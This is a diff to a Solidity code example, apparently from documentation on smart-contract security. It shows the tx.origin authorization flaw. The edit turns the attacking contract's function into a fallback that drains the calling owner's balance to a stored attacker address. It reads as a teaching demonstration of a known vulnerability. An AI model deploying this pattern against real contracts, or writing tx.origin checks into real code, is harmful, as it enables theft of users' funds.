@@ -321,19 +321,23 @@ contract MyContract {
         require(tx.origin == owner);
         receiver.transfer(amount);
     }
+    
 }
 
 contract AttackingContract {
 
     MyContract myContract;
+    address attacker;
 
     function AttackingContract(address myContractAddress) public {
         myContract = MyContract(myContractAddress);
+        attacker = msg.sender;
     }
 
-    function sayHi() public {
-        myContract.sendTo(msg.sender, 1000000);
+    function() public {
+        myContract.sendTo(attacker, msg.sender.balance);
     }
+    
 }
 ```
 
